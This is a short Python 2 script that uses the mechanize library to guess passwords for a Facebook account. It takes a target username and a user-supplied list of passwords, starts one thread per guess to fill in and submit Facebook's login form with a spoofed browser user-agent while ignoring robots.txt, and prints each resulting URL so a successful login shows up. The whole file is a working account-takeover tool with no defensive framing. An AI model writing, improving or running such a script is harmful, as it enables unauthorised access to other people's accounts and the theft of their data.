import mechanize
import itertools
import sys
from threading import Thread



def login(name,password):
    email = name
    password = password
    br = mechanize.Browser()
    br.set_handle_robots(False)
    br.addheaders = [('User-agent', 'Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.90 Safari/537.36')]
    br.open('https://www.facebook.com')
    br.select_form(nr=0)
    br.form['email'] = str(email)
    br.form['pass'] = str(password)
    br.submit()
    print '\nEmail: ',email
    print 'Password: ',password
    print 'Url: ',br.geturl()



def create_usernames():
    firstname = raw_input('Enter Username: ')
    passwords = []
    size_of_list = int(input('Enter no. of Passwords to check: '))
    print ''
    for x in range(1, size_of_list + 1):
        password = raw_input('Enter Password: ')
        passwords.append(password)
    for passw in passwords:
        username = firstname
        t = Thread(target=login, args=(username,passw))
        t.start()
if __name__ == '__main__':
    create_usernames()
    
